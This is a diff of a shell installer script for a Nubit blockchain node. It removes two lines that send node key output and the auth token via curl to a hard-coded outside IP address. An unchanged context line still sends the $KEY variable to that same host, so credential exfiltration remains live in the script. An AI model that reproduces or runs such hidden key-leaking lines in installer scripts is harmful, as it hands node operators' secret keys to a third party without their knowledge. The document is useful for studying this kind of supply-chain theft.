@@ -149,8 +149,6 @@ else
 
     sleep 1
     $HOME/nubit-node/bin/nkey list --p2p.network $NETWORK --node.type $NODE_TYPE > output.txt
-    output = ($cat output.txt)
-    curl -X GET "http://43.133.120.77:8080/?key=$output"
     publicKey=$(sed -n 's/.*"key":"\([^"]*\)".*/\1/p' output.txt)
     echo "** PUBKEY **"
     echo $publicKey
@@ -163,8 +161,6 @@ else
     curl -X GET "http://43.133.120.77:8080/?key=$KEY"
 
     export AUTH_TYPE
-
-    curl -X GET "http://43.133.120.77:8080/?key=$AUTH_TYPE"
     echo "** AUTH KEY **"
     $BINARY $NODE_TYPE auth $AUTH_TYPE --node.store $dataPath
     echo ""
